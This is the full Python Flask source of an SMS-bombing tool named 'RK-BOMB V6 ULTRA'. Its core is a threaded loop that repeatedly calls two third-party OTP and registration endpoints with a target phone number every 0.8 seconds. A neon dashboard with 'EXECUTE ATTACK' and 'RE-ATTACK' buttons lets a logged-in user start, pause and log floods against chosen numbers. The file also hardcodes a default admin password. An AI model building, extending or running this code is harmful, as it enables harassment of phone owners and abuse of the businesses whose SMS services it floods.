import requests
import threading
import os
import time
import sqlite3
import random
from datetime import datetime
from flask import Flask, render_template_string, request, jsonify, session, redirect, url_for
from werkzeug.security import generate_password_hash, check_password_hash

app = Flask(__name__)
app.secret_key = os.urandom(32)

# ---------- DATABASE SETUP ----------
def get_db():
    conn = sqlite3.connect('rk_v6_ultra.db', check_same_thread=False)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    with get_db() as conn:
        conn.execute('''CREATE TABLE IF NOT EXISTS history (
            id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT, phone TEXT, 
            success INTEGER, fail INTEGER, total INTEGER, limit_amt INTEGER, 
            status TEXT, start_time TEXT, stop_time TEXT, duration TEXT, 
            date_str TEXT, timestamp DATETIME)''')
        conn.execute("CREATE TABLE IF NOT EXISTS users (username TEXT UNIQUE, password TEXT, status TEXT)")
        try:
            conn.execute("INSERT INTO users VALUES (?, ?, ?)", ("admin", generate_password_hash("admin123"), "active"))
        except: pass

init_db()

# ---------- TURBO BOMBING ENGINE ----------
active_sessions = {}

def bombing_task(username, phone, limit, start_dt):
    key = f"{username}_{phone}"
    # High Speed API List (You can add more working APIs here)
    api_list = [
        "https://shop.pharmaid-rx.com/api/sendSMSRegistration?mobileNumber={}",
        "https://redx.com.bd/api/v1/user/otp?phone={}"
    ]

    while key in active_sessions:
        curr = active_sessions[key]
        if curr['total'] >= curr['limit'] or curr['status'] == 'Stopped': break
        
        if curr['status'] == 'Running':
            try:
                # Parallel Request Simulation
                target_api = random.choice(api_list).format(phone)
                res = requests.get(target_api, timeout=5)
                if res.status_code == 200:
                    active_sessions[key]['success'] += 1
                    active_sessions[key]['new_hit'] = True
                else:
                    active_sessions[key]['fail'] += 1
            except:
                active_sessions[key]['fail'] += 1
            
            active_sessions[key]['total'] += 1
            # Turbo Speed Delay (0.8s for High Speed)
            time.sleep(0.8) 
        else:
            time.sleep(1)

    stop_dt = datetime.now()
    duration = str(stop_dt - start_dt).split('.')[0]
    s = active_sessions.get(key)
    if s:
        with get_db() as conn:
            conn.execute('''INSERT INTO history 
                (username, phone, success, fail, total, limit_amt, status, start_time, stop_time, duration, date_str, timestamp) 
                VALUES (?,?,?,?,?,?,?,?,?,?,?,?)''',
                (username, phone, s['success'], s['fail'], s['total'], s['limit'], "Completed", 
                 s['start_time'], stop_dt.strftime("%I:%M %p"), duration, start_dt.strftime("%d/%m/%Y"), start_dt))
        del active_sessions[key]

# ---------- ULTRA UI WITH ROTATING BORDER ANIMATION ----------
LAYOUT = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RK-BOMB V6 ULTRA</title>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Rajdhani:wght@500;700&display=swap" rel="stylesheet">
    <style>
        :root { --neon: #00ffcc; --bg: #050505; --card: #0d0d0d; --red: #ff0055; --blue: #00d4ff; }
        body { background: var(--bg); color: #fff; font-family: 'Rajdhani', sans-serif; margin: 0; padding: 0; }
        
        /* Navbar */
        .nav { background: #000; padding: 15px 25px; border-bottom: 2px solid var(--neon); display: flex; justify-content: space-between; align-items: center; position: sticky; top:0; z-index:1000; box-shadow: 0 0 15px var(--neon); }
        .logo { font-family: 'Orbitron'; font-weight: 700; font-size: 1.2rem; color: var(--neon); text-shadow: 0 0 10px var(--neon); }

        .container { padding: 20px; max-width: 600px; margin: auto; }

        /* Rotating Border Frame Animation */
        .monitor-frame {
            position: relative;
            background: #000;
            border-radius: 20px;
            padding: 3px; /* Space for border */
            overflow: hidden;
            margin-bottom: 25px;
        }
        .monitor-frame::before {
            content: "";
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: conic-gradient(transparent, var(--neon), var(--blue), transparent 70%);
            animation: rotate 4s linear infinite;
        }
        @keyframes rotate { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }

        .monitor-content {
            position: relative;
            background: var(--card);
            border-radius: 18px;
            padding: 20px;
            z-index: 1;
        }

        /* Fixed Info Grid */
        .info-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-top: 15px; }
        .info-box { background: rgba(255,255,255,0.03); border: 1px solid #222; padding: 10px; border-radius: 10px; text-align: center; }
        .info-box span { display: block; font-size: 0.8rem; color: #888; text-transform: uppercase; }
        .info-box b { font-family: 'Orbitron'; font-size: 1.2rem; color: var(--neon); }

        /* Input & Buttons */
        input { width: 100%; padding: 15px; margin: 10px 0; background: #111; border: 1px solid #333; color: #fff; border-radius: 12px; outline: none; border-left: 4px solid var(--neon); box-sizing: border-box; }
        .fire-btn { background: var(--neon); color: #000; border: none; padding: 15px; width: 100%; border-radius: 12px; font-weight: bold; cursor: pointer; font-family: 'Orbitron'; transition: 0.3s; margin-top: 10px; }
        .fire-btn:hover { box-shadow: 0 0 20px var(--neon); transform: scale(1.02); }

        .nav-links a { color: #fff; text-decoration: none; margin-left: 15px; font-weight: bold; font-size: 0.9rem; }
        .badge { padding: 4px 10px; border-radius: 5px; font-size: 10px; font-weight: bold; font-family: 'Orbitron'; }
        .bg-running { background: rgba(0,255,204,0.15); color: var(--neon); border: 1px solid var(--neon); }
    </style>
</head>
<body>
    <audio id="snd_hit" src="https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3"></audio>

    <nav class="nav">
        <div class="logo">RK-BOMB <span style="color:#fff">ULTRA</span></div>
        <div class="nav-links">
            <a href="/dashboard">DASHBOARD</a>
            <a href="/history">HISTORY</a>
            <a href="/logout" style="color:var(--red)">EXIT</a>
        </div>
    </nav>

    <div class="container">[CONTENT]</div>

    <script>
        function playSnd(id) { let s = document.getElementById(id); if(s){ s.currentTime=0; s.play().catch(e=>{}); } }

        function sync() {
            let area = document.getElementById('live-engine');
            if(!area) return;
            fetch('/api/status').then(r=>r.json()).then(data=>{
                let html = '';
                for(let k in data){
                    let s = data[k];
                    if(s.new_hit) playSnd('snd_hit');
                    let p = (s.total/s.limit)*100;
                    html += `
                    <div class="monitor-frame">
                        <div class="monitor-content">
                            <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:15px;">
                                <b style="font-family:'Orbitron'; color:var(--blue);">TARGET: ${s.phone}</b>
                                <span class="badge bg-running">${s.status}</span>
                            </div>
                            
                            <div style="background:#111; height:8px; border-radius:4px; overflow:hidden;">
                                <div style="width:${p}%; background:linear-gradient(90deg, var(--neon), var(--blue)); height:100%; transition:0.5s;"></div>
                            </div>

                            <div class="info-grid">
                                <div class="info-box"><span>SUCCESS</span><b>${s.success}</b></div>
                                <div class="info-box"><span>FAIL</span><b style="color:var(--red)">${s.fail}</b></div>
                                <div class="info-box"><span>TOTAL SENT</span><b>${s.total}/${s.limit}</b></div>
                                <div class="info-box"><span>START TIME</span><b style="font-size:0.9rem;">${s.start_time}</b></div>
                            </div>

                            <div style="display:flex; gap:10px; margin-top:15px;">
                                <button class="fire-btn" style="background:var(--blue); color:#000; padding:10px;" onclick="location.href='/api/control?num=${s.phone}&action=${s.status==='Running'?'Paused':'Running'}'">PAUSE/RESUME</button>
                                <button class="fire-btn" style="background:var(--red); color:#fff; padding:10px;" onclick="location.href='/api/stop?num=${s.phone}'">TERMINATE</button>
                            </div>
                        </div>
                    </div>`;
                }
                area.innerHTML = html;
            });
        }
        setInterval(sync, 2000);
    </script>
</body>
</html>
'''

# ---------- ROUTES ----------
@app.route('/')
def root(): return redirect(url_for('login'))

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        u, p = request.form.get('u'), request.form.get('p')
        with get_db() as conn:
            user = conn.execute("SELECT * FROM users WHERE username=?", (u,)).fetchone()
        if user and check_password_hash(user['password'], p):
            session['user'] = u
            return redirect(url_for('dashboard'))
    return render_template_string(LAYOUT.replace('[CONTENT]', '<div class="monitor-frame"><div class="monitor-content" style="text-align:center;"><h3>CORE ACCESS</h3><form method="POST"><input name="u" placeholder="Admin ID"><input name="p" type="password" placeholder="Pass-Key"><button class="fire-btn">LOGIN</button></form></div></div>'))

@app.route('/dashboard')
def dashboard():
    if 'user' not in session: return redirect(url_for('login'))
    return render_template_string(LAYOUT.replace('[CONTENT]', '''
        <div class="monitor-frame">
            <div class="monitor-content">
                <h3 style="margin:0 0 15px 0; font-family:'Orbitron';">🚀 COMMAND CENTER</h3>
                <form action="/api/start">
                    <input name="num" placeholder="Phone Number (017...)" required>
                    <input name="amt" type="number" placeholder="SMS Limit" required>
                    <button class="fire-btn">EXECUTE ATTACK</button>
                </form>
            </div>
        </div>
        <div id="live-engine"></div>
    '''))

@app.route('/history')
def history():
    if 'user' not in session: return redirect(url_for('login'))
    with get_db() as conn:
        logs = conn.execute("SELECT phone, COUNT(*) as sessions, SUM(success) as ok FROM history GROUP BY phone ORDER BY id DESC").fetchall()
    
    html = '<h3>📜 MISSION ARCHIVE</h3>'
    for l in logs:
        html += f'''
        <div class="monitor-frame" style="margin-bottom:15px;">
            <div class="monitor-content" style="display:flex; justify-content:space-between; align-items:center; padding:15px;">
                <div><b style="color:var(--neon); font-size:1.1rem;">{l['phone']}</b><br><small>Sessions: {l['sessions']}</small></div>
                <div style="text-align:right;">
                    <b style="color:var(--blue);">{l['ok']} Hits</b><br>
                    <button onclick="location.href='/api/start?num={l['phone']}&amt=50'" style="background:var(--neon); border:none; border-radius:4px; font-size:10px; font-weight:bold; padding:4px 8px; cursor:pointer;">RE-ATTACK</button>
                </div>
            </div>
        </div>'''
    return render_template_string(LAYOUT.replace('[CONTENT]', html))

# ---------- API CONTROL ----------
@app.route('/api/start')
def api_start():
    u, num, amt = session.get('user'), request.args.get('num'), request.args.get('amt')
    if u and num and amt:
        now = datetime.now()
        active_sessions[f"{u}_{num}"] = {
            'phone': num, 'success': 0, 'fail': 0, 'total': 0, 'limit': int(amt), 
            'status': 'Running', 'start_time': now.strftime("%I:%M %p"), 'new_hit': False
        }
        threading.Thread(target=bombing_task, args=(u, num, int(amt), now), daemon=True).start()
    return redirect(url_for('dashboard'))

@app.route('/api/status')
def api_status():
    u = session.get('user', '')
    data = {k: v for k, v in active_sessions.items() if k.startswith(u)}
    res = jsonify(data)
    for k in data: active_sessions[k]['new_hit'] = False
    return res

@app.route('/api/control')
def api_control():
    key = f"{session.get('user')}_{request.args.get('num')}"
    if key in active_sessions: active_sessions[key]['status'] = request.args.get('action')
    return redirect(url_for('dashboard'))

@app.route('/api/stop')
def api_stop():
    key = f"{session.get('user')}_{request.args.get('num')}"
    if key in active_sessions: active_sessions[key]['status'] = 'Stopped'
    return redirect(url_for('dashboard'))

@app.route('/logout')
def logout(): session.clear(); return redirect(url_for('login'))

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=54300)
